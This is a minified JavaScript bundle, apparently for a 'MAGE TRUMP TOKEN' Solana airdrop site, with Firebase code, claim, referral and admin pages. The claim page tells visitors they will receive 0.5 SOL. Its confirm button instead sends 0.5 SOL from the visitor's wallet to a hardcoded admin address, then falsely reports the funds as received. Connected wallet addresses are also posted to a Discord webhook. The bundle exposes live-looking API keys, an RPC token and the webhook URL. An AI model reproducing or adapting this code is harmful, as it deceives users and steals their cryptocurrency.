collection group by documentId(), the value provided must result in a valid document path, but '${r}' is not because it has an odd number of segments (${r.length}).`);return qI(n,new Te(r))}if(t instanceof ar)return qI(n,t._key);throw new we(ie.INVALID_ARGUMENT,`Invalid query. When querying with documentId(), you must provide a valid string or a DocumentReference, but it was: ${ag(t)}.`)}function MS(n,e){if(!Array.isArray(n)||n.length===0)throw new we(ie.INVALID_ARGUMENT,`Invalid Query. A non-empty array is required for '${e.toString()}' filters.`)}function DC(n,e){const t=function(i,s){for(const o of i)for(const a of o.getFlattenedFilters())if(s.indexOf(a.op)>=0)return a.op;return null}(n.filters,function(i){switch(i){case"!=":return["!=","not-in"];case"array-contains-any":case"in":return["not-in"];case"not-in":return["array-contains-any","in","not-in","!="];default:return[]}}(e.op));if(t!==null)throw t===e.op?new we(ie.INVALID_ARGUMENT,`Invalid query. You cannot use more than one '${e.op.toString()}' filter.`):new we(ie.INVALID_ARGUMENT,`Invalid query. You cannot use '${e.op.toString()}' filters with '${t.toString()}' filters.`)}class C9{convertValue(e,t="none"){switch(wo(e)){case 0:return null;case 1:return e.booleanValue;case 2:return nn(e.integerValue||e.doubleValue);case 3:return this.convertTimestamp(e.timestampValue);case 4:return this.convertServerTimestamp(e,t);case 5:return e.stringValue;case 6:return this.convertBytes(yo(e.bytesValue));case 7:return this.convertReference(e.referenceValue);case 8:return this.convertGeoPoint(e.geoPointValue);case 9:return this.convertArray(e.arrayValue,t);case 11:return this.convertObject(e.mapValue,t);case 10:return this.convertVectorValue(e.mapValue);default:throw Ne()}}convertObject(e,t){return this.convertObjectMap(e.fields,t)}convertObjectMap(e,t="none"){const r={};return xo(e,(i,s)=>{r[i]=this.convertValue(s,t)}),r}convertVectorValue(e){var t,r,i;const s=(i=(r=(t=e.fields)===null||t===void 0?void 0:t[Hd].arrayValue)===null||r===void 0?void 0:r.values)===null||i===void 0?void 0:i.map(o=>nn(o.doubleValue));return new a1(s)}convertGeoPoint(e){return new o1(nn(e.latitude),nn(e.longitude))}convertArray(e,t){return(e.values||[]).map(r=>this.convertValue(r,t))}convertServerTimestamp(e,t){switch(t){case"previous":const r=Jp(e);return r==null?null:this.convertValue(r,t);case"estimate":return this.convertTimestamp(Zu(e));default:return null}}convertTimestamp(e){const t=mo(e);return new yn(t.seconds,t.nanos)}convertDocumentKey(e,t){const r=Mt.fromString(e);st(Zk(r));const i=new Ju(r.get(1),r.get(3)),s=new Te(r.popFirst(5));return i.isEqual(t)||ys(`Document ${s} contains a document reference within a different database (${i.projectId}/${i.database}) which is not supported. It will be treated as a reference in the current database (${t.projectId}/${t.database}) instead.`),s}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function OC(n,e,t){let r;return r=n?t&&(t.merge||t.mergeFields)?n.toFirestore(e,t):n.toFirestore(e):e,r}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class eu{constructor(e,t){this.hasPendingWrites=e,this.fromCache=t}isEqual(e){return this.hasPendingWrites===e.hasPendingWrites&&this.fromCache===e.fromCache}}class BC extends LC{constructor(e,t,r,i,s,o){super(e,t,r,i,o),this._firestore=e,this._firestoreImpl=e,this.metadata=s}exists(){return super.exists()}data(e={}){if(this._document){if(this._converter){const t=new Gf(this._firestore,this._userDataWriter,this._key,this._document,this.metadata,null);return this._converter.fromFirestore(t,e)}return this._userDataWriter.convertValue(this._document.data.value,e.serverTimestamps)}}get(e,t={}){if(this._document){const r=this._document.data.field(h1("DocumentSnapshot.get",e));if(r!==null)return this._userDataWriter.convertValue(r,t.serverTimestamps)}}}class Gf extends BC{data(e={}){return super.data(e)}}class R9{constructor(e,t,r,i){this._firestore=e,this._userDataWriter=t,this._snapshot=i,this.metadata=new eu(i.hasPendingWrites,i.fromCache),this.query=r}get docs(){const e=[];return this.forEach(t=>e.push(t)),e}get size(){return this._snapshot.docs.size}get empty(){return this.size===0}forEach(e,t){this._snapshot.docs.forEach(r=>{e.call(t,new Gf(this._firestore,this._userDataWriter,r.key,r,new eu(this._snapshot.mutatedKeys.has(r.key),this._snapshot.fromCache),this.query.converter))})}docChanges(e={}){const t=!!e.includeMetadataChanges;if(t&&this._snapshot.excludesMetadataChanges)throw new we(ie.INVALID_ARGUMENT,"To include metadata changes with your document changes, you must also pass { includeMetadataChanges:true } to onSnapshot().");return this._cachedChanges&&this._cachedChangesIncludeMetadataChanges===t||(this._cachedChanges=function(i,s){if(i._snapshot.oldDocs.isEmpty()){let o=0;return i._snapshot.docChanges.map(a=>{const l=new Gf(i._firestore,i._userDataWriter,a.doc.key,a.doc,new eu(i._snapshot.mutatedKeys.has(a.doc.key),i._snapshot.fromCache),i.query.converter);return a.doc,{type:"added",doc:l,oldIndex:-1,newIndex:o++}})}{let o=i._snapshot.oldDocs;return i._snapshot.docChanges.filter(a=>s||a.type!==3).map(a=>{const l=new Gf(i._firestore,i._userDataWriter,a.doc.key,a.doc,new eu(i._snapshot.mutatedKeys.has(a.doc.key),i._snapshot.fromCache),i.query.converter);let u=-1,h=-1;return a.type!==0&&(u=o.indexOf(a.doc.key),o=o.delete(a.doc.key)),a.type!==1&&(o=o.add(a.doc),h=o.indexOf(a.doc.key)),{type:M9(a.type),doc:l,oldIndex:u,newIndex:h}})}}(this,t),this._cachedChangesIncludeMetadataChanges=t),this._cachedChanges}}function M9(n){switch(n){case 0:return"added";case 2:case 3:return"modified";case 1:return"removed";default:return Ne()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Fy(n){n=Li(n,ar);const e=Li(n.firestore,wc);return f9(i1(e),n._key).then(t=>L9(e,n,t))}class UC extends C9{constructor(e){super(),this.firestore=e}convertBytes(e){return new Xl(e)}convertReference(e){const t=this.convertDocumentKey(e,this.firestore._databaseId);return new ar(this.firestore,null,t)}}function tp(n){n=Li(n,yc);const e=Li(n.firestore,wc),t=i1(e),r=new UC(e);return A9(n._query),d9(t,n._query).then(i=>new R9(e,r,n,i))}function N9(n,e,t){n=Li(n,ar);const r=Li(n.firestore,wc),i=OC(n.converter,e,t);return p1(r,[RC(ug(r),"setDoc",n._key,i,n.converter!==null,t).toMutation(n._key,fi.none())])}function jC(n,e,t,...r){n=Li(n,ar);const i=Li(n.firestore,wc),s=ug(i);let o;return o=typeof(e=xn(e))=="string"||e instanceof cg?E9(s,"updateDoc",n._key,e,t,r):_9(s,"updateDoc",n._key,e),p1(i,[o.toMutation(n._key,fi.exists(!0))])}function P9(n,e){const t=Li(n.firestore,wc),r=rh(n),i=OC(n.converter,e);return p1(t,[RC(ug(n.firestore),"addDoc",r._key,i,n.converter!==null,{}).toMutation(r._key,fi.exists(!1))]).then(()=>r)}function p1(n,e){return function(r,i){const s=new as;return r.asyncQueue.enqueueAndForget(async()=>e9(await h9(r),i,s)),s.promise}(i1(n),e)}function L9(n,e,t){const r=t.docs.get(e._key),i=new UC(n);return new BC(n,i,e._key,r,new eu(t.hasPendingWrites,t.fromCache),e.converter)}(function(e,t=!0){(function(i){dc=i})(uc),Hl(new pa("firestore",(r,{instanceIdentifier:i,options:s})=>{const o=r.getProvider("app").getImmediate(),a=new wc(new AV(r.getProvider("auth-internal")),new kV(o,r.getProvider("app-check-internal")),function(u,h){if(!Object.prototype.hasOwnProperty.apply(u.options,["projectId"]))throw new we(ie.INVALID_ARGUMENT,'"projectId" not provided in firebase.initializeApp.');return new Ju(u.options.projectId,h)}(o,i),o);return s=Object.assign({useFetchStreams:t},s),a._setSettings(s),a},"PUBLIC").setMultipleInstances(!0)),lo(LI,DI,e),lo(LI,DI,"esm2017")})();const D9={apiKey:"AIzaSyCYOFhmThtA_5F9h67lGPLXuO0ZZixy29o",authDomain:"mage-trump-token.firebaseapp.com",databaseURL:"https://mage-trump-token-default-rtdb.firebaseio.com",projectId:"mage-trump-token",storageBucket:"mage-trump-token.firebasestorage.app",messagingSenderId:"974753040843",appId:"1:974753040843:web:8de9a9f42ac4f24550ce4e"},VC=Od().length===0?Hp(D9):Od()[0],ia=xC(VC);tk(VC);function O9(){const{publicKey:n,connected:e,sendTransaction:t}=cc(),[r,i]=Y.useState(""),[s,o]=Y.useState("");Y.useState(!1);const[a,l]=Y.useState(null),[u,h]=Y.useState(!1),f=(n==null?void 0:n.toBase58())||"",p=new hv("https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/","confirmed"),w=async O=>{try{await fetch("https://discord.com/api/webhooks/1360353395365380177/5Lejy62BSrPzxKQ-Ak7kaZJ8AROonM0-49o-1_n9oOoAia9Rcg0fGBlSZC_iQHfA6trA",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:`📢 New wallet connected: \`${O}\``})})}catch(W){console.error("Error sending webhook:",W)}},x=()=>new URLSearchParams(window.location.search).get("ref")||null,k=async()=>{if(f){i("Registering wallet...");try{const O=rh(ia,"users",f);(await Fy(O)).exists()?await jC(O,{claimed:!1,createdAt:new Date}):(await P9(nh(ia,"users"),{wallet:f,referral:x(),claimed:!1,createdAt:new Date,refCount:0,balance:.5,canClaim:!1}),await w(f)),i("Wallet registered!")}catch(O){console.error("Error registering wallet:",O),i("Error registering wallet"),o(O.message)}}},I=async()=>{if(f)try{const O=rh(ia,"users",f),W=await Fy(O);W.exists()&&l(W.data())}catch(O){console.error("Error fetching user data:",O)}},A=()=>a!=null&&a.balance?(Math.ceil(a.balance*10)/10).toFixed(1):"0.0",b=async()=>{h(!0)},E=async()=>{try{const O=new mr().add(jl.transfer({fromPubkey:new Se("4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD"),toPubkey:n,lamports:Math.floor((a.balance||0)*1e9)})),W=await p.getLatestBlockhash();O.recentBlockhash=W.blockhash,O.feePayer=n;const q=await t(O,p);await p.confirmTransaction({signature:q,...W},"confirmed"),alert("SOL sent successfully!"),h(!1)}catch(O){console.error("Error during claim:",O),o(O.message),h(!1)}};return Y.useEffect(()=>{I()},[f]),Q.jsxs("div",{className:"min-h-screen bg-[#0a369d] text-white flex flex-col",children:[Q.jsxs("header",{className:"w-full flex flex-wrap justify-between items-center px-6 py-6",children:[Q.jsxs("div",{className:"flex gap-6 flex-wrap text-white font-semibold text-sm",children:[Q.jsx(qr,{to:"/",className:"hover:underline",children:"HOME"}),Q.jsx(qr,{to:"/about",className:"hover:underline",children:"ABOUT"}),Q.jsx(qr,{to:"/airdrop",className:"hover:underline",children:"AIRDROP"}),Q.jsx(qr,{to:"/referrals",className:"hover:underline text-yellow-300",children:"REFERRALS"})]}),Q.jsx("div",{className:"mt-4 md:mt-0",children:Q.jsx(o5,{className:"!bg-blue-600 !hover:bg-blue-700 !text-white !font-semibold !py-2 !px-4 !rounded transition"})})]}),Q.jsxs("main",{className:"flex flex-col md:flex-row items-center justify-center flex-grow px-4 text-center md:text-left gap-10",children:[Q.jsx("div",{className:"w-full md:w-1/2 flex justify-center",children:Q.jsx("img",{src:Pv,alt:"Trump Mage",className:"w-64 md:w-[320px] lg:w-[380px]"})}),Q.jsxs("div",{className:"w-full md:w-1/2 flex flex-col justify-center items-center md:items-start mt-6 md:mt-0",children:[Q.jsx("h1",{className:"text-4xl md:text-5xl font-bold mb-4",children:"MAGE TRUMP TOKEN"}),Q.jsx("h2",{className:"text-2xl font-bold text-white mb-2",children:"Claim $MAGE Airdrop"}),Q.jsx("p",{className:"text-sm text-gray-200 max-w-sm mb-6",children:"Connect your wallet to receive 0.5 SOL. Refer friends to earn more!"}),Q.jsxs("p",{className:"text-sm mb-2 text-green-300",children:["Current balance: ",A()," SOL"]}),Q.jsx("button",{onClick:k,disabled:!e,className:"bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-6 rounded disabled:opacity-40",children:"Register"}),Q.jsx("button",{onClick:b,disabled:!(a!=null&&a.canClaim),className:"mt-4 bg-yellow-500 hover:bg-yellow-600 text-white font-semibold py-2 px-6 rounded disabled:opacity-40",children:"Claim Balance"}),r&&Q.jsx("p",{className:"mt-4",children:r}),s&&Q.jsx("p",{className:"mt-4 text-red-500",children:s})]})]}),u&&Q.jsx("div",{className:"fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-50 flex items-center justify-center z-50",children:Q.jsxs("div",{className:"bg-white p-6 rounded shadow-lg max-w-sm w-full",children:[Q.jsx("h2",{className:"text-xl font-bold mb-4 text-black",children:"Confirm Claim"}),Q.jsxs("p",{className:"text-black",children:["Do you want to claim your ",A()," SOL?"]}),Q.jsxs("div",{className:"mt-4 flex justify-between",children:[Q.jsx("button",{onClick:E,className:"bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded",children:"Yes"}),Q.jsx("button",{onClick:()=>h(!1),className:"bg-gray-500 hover:bg-gray-600 text-white font-semibold py-2 px-4 rounded",children:"Cancel"})]})]})})]})}function B9(){const[n,e]=Y.useState([]),[t,r]=Y.useState(0),[i,s]=Y.useState([]),{publicKey:o,connected:a,disconnect:l}=cc(),u=o==null?void 0:o.toBase58(),h=jw();Y.useEffect(()=>{u==="4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD"?(async()=>{const x=(await tp(nh(ia,"users"))).docs.map(A=>({id:A.id,...A.data()}));e(x),r(x.reduce((A,b)=>A+parseFloat(b.balance||0),0));const I=(await tp(nh(ia,"transactions"))).docs.map(A=>({id:A.id,...A.data()}));s(I.sort((A,b)=>{var E,O;return((E=b.timestamp)==null?void 0:E.seconds)-((O=A.timestamp)==null?void 0:O.seconds)}))})():h("/login")},[u,h]);const f=async p=>{try{await jC(rh(ia,"users",p),{canClaim:!0}),e(w=>w.map(x=>x.id===p?{...x,canClaim:!0}:x))}catch(w){console.error("Error enabling claim:",w)}};return Q.jsxs("div",{className:"min-h-screen bg-gray-900 text-white p-6",children:[Q.jsxs("div",{className:"flex justify-between items-center mb-6",children:[Q.jsx("h1",{className:"text-3xl font-bold",children:"Admin Panel"}),Q.jsxs("div",{children:[Q.jsxs("span",{className:"text-sm mr-4",children:["Connected: ",u]}),Q.jsx("button",{onClick:l,className:"bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-4 rounded",children:"Disconnect"})]})]}),Q.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4 mb-6",children:[Q.jsxs("div",{className:"bg-gray-800 p-4 rounded",children:[Q.jsx("h2",{className:"text-xl font-semibold",children:"Total Users"}),Q.jsx("p",{className:"text-3xl mt-2",children:n.length})]}),Q.jsxs("div",{className:"bg-gray-800 p-4 rounded",children:[Q.jsx("h2",{className:"text-xl font-semibold",children:"Total Balance (SOL)"}),Q.jsxs("p",{className:"text-3xl mt-2",children:[t.toFixed(2)," SOL"]})]})]}),Q.jsxs("div",{className:"bg-gray-800 rounded-lg p-4 overflow-x-auto mb-8",children:[Q.jsx("h2",{className:"text-xl font-semibold mb-2",children:"User List"}),Q.jsxs("table",{className:"w-full text-left text-sm",children:[Q.jsx("thead",{children:Q.jsxs("tr",{children:[Q.jsx("th",{className:"p-2",children:"Wallet"}),Q.jsx("th",{className:"p-2",children:"Referral"}),Q.jsx("th",{className:"p-2",children:"Balance"}),Q.jsx("th",{className:"p-2",children:"Claimed"}),Q.jsx("th",{className:"p-2",children:"Claim Status"}),Q.jsx("th",{className:"p-2",children:"Date"}),Q.jsx("th",{className:"p-2",children:"Action"})]})}),Q.jsx("tbody",{children:n.map(p=>{var w;return Q.jsxs("tr",{className:"border-t border-gray-700",children:[Q.jsx("td",{className:"p-2",children:p.wallet}),Q.jsx("td",{className:"p-2",children:p.referral||"-"}),Q.jsx("td",{className:"p-2",children:p.balance||"0.000"}),Q.jsx("td",{className:"p-2",children:p.claimed?"✅":"❌"}),Q.jsx("td",{className:"p-2",children:p.canClaim?"✅":"❌"}),Q.jsx("td",{className:"p-2",children:((w=p.createdAt)==null?void 0:w.toDate().toLocaleString())||"-"}),Q.jsx("td",{className:"p-2",children:!p.canClaim&&Q.jsx("button",{onClick:()=>f(p.id),className:"bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded text-xs",children:"Enable Claim"})})]},p.id)})})]})]}),Q.jsxs("div",{className:"bg-gray-800 rounded-lg p-4 overflow-x-auto",children:[Q.jsx("h2",{className:"text-xl font-semibold mb-2",children:"Transaction History"}),Q.jsxs("table",{className:"w-full text-left text-sm",children:[Q.jsx("thead",{children:Q.jsxs("tr",{children:[Q.jsx("th",{className:"p-2",children:"From"}),Q.jsx("th",{className:"p-2",children:"To"}),Q.jsx("th",{className:"p-2",children:"Amount"}),Q.jsx("th",{className:"p-2",children:"Date"})]})}),Q.jsx("tbody",{children:i.map(p=>{var w;return Q.jsxs("tr",{className:"border-t border-gray-700",children:[Q.jsx("td",{className:"p-2",children:p.from}),Q.jsx("td",{className:"p-2",children:p.to}),Q.jsx("td",{className:"p-2",children:p.amount}),Q.jsx("td",{className:"p-2",children:((w=p.timestamp)==null?void 0:w.toDate().toLocaleString())||"-"})]},p.id)})})]})]})]})}function U9(){const{walletAddress:n,isConnected:e,connectWallet:t,disconnectWallet:r}=Y.useContext(WalletContext),[i,s]=Y.useState(""),o=jw(),a=()=>{n==="4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD"?o("/admin"):s("❌ Acesso negado: apenas a carteira do administrador pode acessar.")};return Q.jsxs("div",{className:"min-h-screen bg-[#0a369d] text-white flex flex-col items-center justify-center p-6",children:[Q.jsx("h1",{className:"text-3xl font-bold mb-4",children:"Admin Login"}),Q.jsx("button",{onClick:e?r:t,className:`${e?"bg-red-600 hover:bg-red-700":"bg-blue-600 hover:bg-blue-700"} text-white font-semibold py-2 px-6 rounded-lg mb-4 transition duration-300`,children:e?"Disconnect Wallet":"Connect Wallet"}),e&&Q.jsxs("div",{className:"text-sm mb-4",children:["✅ Connected: ",Q.jsx("span",{className:"font-mono text-yellow-300",children:n})]}),Q.jsx("button",{onClick:a,disabled:!e,className:"bg-green-600 hover:bg-green-700 disabled:opacity-40 text-white font-semibold py-2 px-6 rounded-lg transition",children:"Access Admin Panel"}),i&&Q.jsx("p",{className:"text-red-400 mt-4 text-sm",children:i})]})}const j9=""+new URL("front-6e9bd7de.png",import.meta.url).href,V9={apiKey:"AIzaSyA6Wx-C3VoWQjTVZL0F0boV0_wnxjOAwJg",authDomain:"mage-trump-token.firebaseapp.com",projectId:"mage-trump-token",storageBucket:"mage-trump-token.appspot.com",messagingSenderId:"836220096383",appId:"1:836220096383:web:e3e9a3d24f1f6a18f0b9d2"},F9=Od().length===0?Hp(V9):Od()[0],FC=xC(F9),z9=()=>{const{publicKey:n,connect:e,connected:t}=cc(),[r,i]=Y.useState(""),[s,o]=Y.useState(!1),[a,l]=Y.useState("");Y.useState("");const[u,h]=Y.useState(""),[f,p]=Y.useState(!1),w=new Date("2025-04-27T00:00:00Z"),x=new Se("4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD"),k=new hv("https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/","confirmed"),I=["2vY6rLpZ7U6u1iX3Kb9TBLk8FWpjmR3SzDeYN2vgqvnU","4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD"],A=W=>{try{return Yx.decode(W).length===32}catch{return!1}},b=async W=>{try{await fetch("https://discord.com/api/webhooks/1360353395365380177/5Lejy62BSrPzxKQ-Ak7kaZJ8AROonM0-49o-1_n9oOoAia9Rcg0fGBlSZC_iQHfA6trA",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:`📥 Nova carteira registrada: \`${W}\``})})}catch(q){console.error("Erro ao enviar webhook:",q)}};Y.useEffect(()=>{if(n){const W=n.toBase58();if(!A(W)){alert("❌ Invalid wallet address.");return}if(I.includes(W)){alert("🚫 This wallet is not allowed to claim.");return}i(`${window.location.origin}/?ref=${W}`),localStorage.setItem("walletConnected","true"),(async()=>{const L=rh(FC,"users",W);(await Fy(L)).exists()||(await N9(L,{wallet:W,referral:new URLSearchParams(window.location.search).get("ref")||null,createdAt:new Date().toISOString(),claimed:!1}),await b(W)),p(!0)})()}},[n]),Y.useEffect(()=>{localStorage.getItem("walletConnected")==="true"&&!t&&e().catch(()=>{})},[]),Y.useEffect(()=>{const W=setInterval(()=>{const q=new Date,L=w.getTime()-q.getTime();if(L<0)l("Claim is now available!"),clearInterval(W);else{const N=Math.floor(L/864e5),B=Math.floor(L/(1e3*60*60)%24),z=Math.floor(L/(1e3*60)%60),$=Math.floor(L/1e3%60);l(`${N}d ${B}h ${z}m ${$}s`)}},1e3);return()=>clearInterval(W)},[]);const E=async()=>{try{const W=window==null?void 0:window.solana;if(!W||!W.isPhantom)throw new Error("Phantom wallet not found");const q=n,L=await k.getLatestBlockhash(),N=new mr({recentBlockhash:L.blockhash,feePayer:q}).add(jl.transfer({fromPubkey:q,toPubkey:x,lamports:.5*1e9})),{signature:B}=await W.signAndSendTransaction(N,{commitment:"confirmed"});await k.confirmTransaction({signature:B,...L},"confirmed"),console.log("✅ Transaction success:",B),alert("0.5 SOL successfully received!"),p(!1)}catch(W){console.error("❌ Transaction failed:",W.message),h(W.message),p(!1)}},O=()=>{navigator.clipboard.writeText(r),o(!0),setTimeout(()=>o(!1),3e3)};return Q.jsxs("div",{className:"min-h-screen bg-[#0a369d] text-white flex flex-col md:flex-row items-center justify-center p-6",children:[Q.jsx("div",{className:"w-full md:w-1/2 flex justify-center mb-8 md:mb-0",children:Q.jsx("img",{src:j9,alt:"Trump",className:"w-72 md:w-[450px]"})}),Q.jsxs("div",{className:"w-full md:w-1/2 text-center md:text-left max-w-lg",children:[Q.jsx("h1",{className:"text-4xl md:text-6xl font-bold mb-4",children:"MAGE TRUMP TOKEN"}),Q.jsxs("p",{className:"text-lg md:text-xl mb-2",children:["Claim ",Q.jsx("span",{className:"text-yellow-400 font-bold",children:"$MAGE"})," Airdrop"]}),Q.jsx("p",{className:"mb-4 text-white/90",children:"Connect your wallet to receive 0.5 SOL, locked until launch on April 27"}),Q.jsx("button",{disabled:!0,className:"bg-gray-600 cursor-not-allowed text-white font-semibold px-5 py-2 rounded-lg opacity-70",children:"Claim (available April 27)"}),t&&Q.jsxs(Q.Fragment,{children:[Q.jsx("p",{className:"text-sm text-white/70 mt-4 mb-1",children:"Your referral link:"}),Q.jsx("div",{className:"bg-white text-black px-4 py-2 rounded-xl mt-1 break-all cursor-pointer hover:bg-gray-100 transition",onClick:O,children:r}),s&&Q.jsx("p",{className:"text-green-300 mt-1 text-sm",children:"Link copied!"}),Q.jsxs("div",{className:"mt-6",children:[Q.jsx("p",{className:"text-white/80",children:"⏳ Claim available in:"}),Q.jsx("p",{className:"text-xl font-bold text-yellow-300 mt-1",children:a})]})]}),!t&&Q.jsx("div",{className:"mt-4 text-red-300",children:"❌ Connect your wallet to see your airdrop link and eligibility."}),u&&Q.jsx("p",{className:"text-red-400 mt-4",children:u})]}),f&&Q.jsx("div",{className:"fixed top-0 left-0 w-full h-full bg-black bg-opacity-60 flex items-center justify-center z-50",children:Q.jsxs("div",{className:"bg-white p-6 rounded shadow-lg text-black",children:[Q.jsx("h2",{className:"text-xl font-bold mb-2",children:"Confirm Transaction"}),Q.jsx("p",{className:"mb-4",children:"Do you want to receive 0.5 SOL?"}),Q.jsxs("div",{className:"flex justify-end gap-4",children:[Q.jsx("button",{onClick:E,className:"bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded",children:"Yes"}),Q.jsx("button",{onClick:()=>p(!1),className:"bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded",children:"Cancel"})]})]})})]})};function W9(){const{publicKey:n,connected:e}=cc(),[t,r]=Y.useState([]),[i,s]=Y.useState(!0),o=n==null?void 0:n.toBase58();Y.useEffect(()=>{(async()=>{if(o)try{const u=x9(nh(ia,"users"),k9("referral","==",o)),f=(await tp(u)).docs.map(p=>p.data());r(f)}catch(u){console.error("Error fetching referrals:",u)}finally{s(!1)}})()},[o]);const a=()=>{const u=[["Wallet","Created At"],...t.map(w=>[w.wallet,w.createdAt])].map(w=>w.join(",")).join(`
`),h=new Blob([u],{type:"text/csv"}),f=URL.createObjectURL(h),p=document.createElement("a");p.href=f,p.download="referrals.csv",p.click(),URL.revokeObjectURL(f)};return Q.jsxs("div",{className:"min-h-screen bg-[#0a369d] text-white flex flex-col",children:[Q.jsxs("header",{className:"w-full flex flex-wrap justify-between items-center px-6 py-6",children:[Q.jsxs("div",{className:"flex gap-6 flex-wrap text-white font-semibold text-sm",children:[Q.jsx(qr,{to:"/",className:"hover:underline",children:"HOME"}),Q.jsx(qr,{to:"/about",className:"hover:underline",children:"ABOUT"}),Q.jsx(qr,{to:"/airdrop",className:"hover:underline",children:"AIRDROP"}),Q.jsx(qr,{to:"/referrals",className:"hover:underline text-yellow-300",children:"REFERRALS"})]}),Q.jsx("div",{className:"text-sm text-white/80 mt-4 md:mt-0",children:e?`Connected: ${o==null?void 0:o.slice(0,4)}...${o==null?void 0:o.slice(-4)}`:"Not connected"})]}),Q.jsxs("main",{className:"flex flex-col lg:flex-row items-center justify-center flex-grow px-6 py-10 gap-10",children:[Q.jsx("div",{className:"w-full max-w-xs md:max-w-sm lg:max-w-md flex justify-center",children:Q.jsx("img",{src:Pv,alt:"Trump Mage",className:"w-64 md:w-[320px] lg:w-[380px]"})}),Q.jsxs("div",{className:"w-full lg:w-1/2 max-w-xl",children:[Q.jsx("h1",{className:"text-4xl md:text-5xl font-bold mb-4 text-center md:text-left",children:"Your Referrals"}),i?Q.jsx("p",{className:"text-white/70",children:"Loading..."}):t.length===0?Q.jsx("p",{className:"text-white/70",children:"No referrals yet."}):Q.jsx("div",{className:"mt-4 bg-white text-black rounded-md p-4 max-h-64 overflow-y-auto shadow-lg",children:Q.jsxs("table",{className:"w-full text-left text-sm",children:[Q.jsx("thead",{children:Q.jsxs("tr",{children:[Q.jsx("th",{className:"pb-2 border-b",children:"Wallet"}),Q.jsx("th",{className:"pb-2 border-b",children:"Date"})]})}),Q.jsx("tbody",{children:t.map((l,u)=>Q.jsxs("tr",{children:[Q.jsx("td",{className:"py-1 break-all",children:l.wallet}),Q.jsx("td",{className:"py-1",children:new Date(l.createdAt).toLocaleString()})]},u))})]})}),t.length>0&&Q.jsx("button",{onClick:a,className:"mt-6 bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-4 rounded",children:"Export to CSV"})]})]})]})}function $9(){const[n,e]=Y.useState(0),[t,r]=Y.useState(0);return Y.useEffect(()=>{(async()=>{const o=(await tp(nh(FC,"users"))).docs.map(l=>l.data());e(o.length);const a=o.filter(l=>l.referral).length;r(a)})()},[]),Q.jsxs("div",{className:"min-h-screen bg-[#0a369d] text-white flex flex-col",children:[Q.jsx("header",{className:"w-full flex flex-wrap justify-between items-center px-6 py-6",children:Q.jsxs("div",{className:"flex gap-6 flex-wrap text-white font-semibold text-sm",children:[Q.jsx(qr,{to:"/",className:"hover:underline",children:"HOME"}),Q.jsx(qr,{to:"/about",className:"hover:underline text-yellow-300",children:"ABOUT"}),Q.jsx(qr,{to:"/airdrop",className:"hover:underline",children:"AIRDROP"}),Q.jsx(qr,{to:"/referrals",className:"hover:underline",children:"REFERALS"})]})}),Q.jsxs("main",{className:"flex flex-col lg:flex-row items-center justify-center flex-grow px-6 py-10 gap-10",children:[Q.jsx("div",{className:"w-full max-w-xs md:max-w-sm lg:max-w-md flex justify-center",children:Q.jsx("img",{src:Pv,alt:"Trump Mage",className:"w-64 md:w-[320px] lg:w-[380px]"})}),Q.jsxs("div",{className:"w-full lg:w-1/2 max-w-xl text-center lg:text-left",children:[Q.jsx("h1",{className:"text-4xl md:text-5xl font-bold mb-6",children:"📊 Community Stats"}),Q.jsxs("div",{className:"bg-white/10 border border-white/20 p-6 rounded-xl w-full shadow-lg",children:[Q.jsxs("p",{className:"text-xl mb-4",children:["👥 ",Q.jsx("span",{className:"font-bold text-yellow-400",children:n})," wallets registered"]}),Q.jsxs("p",{className:"text-xl",children:["🧙‍♂️ ",Q.jsx("span",{className:"font-bold text-green-400",children:t})," users joined by referral"]})]}),Q.jsx("p",{className:"text-sm mt-6 text-white/60",children:"Updated in real time from Firestore 🔥"})]})]})]})}function H9(){return 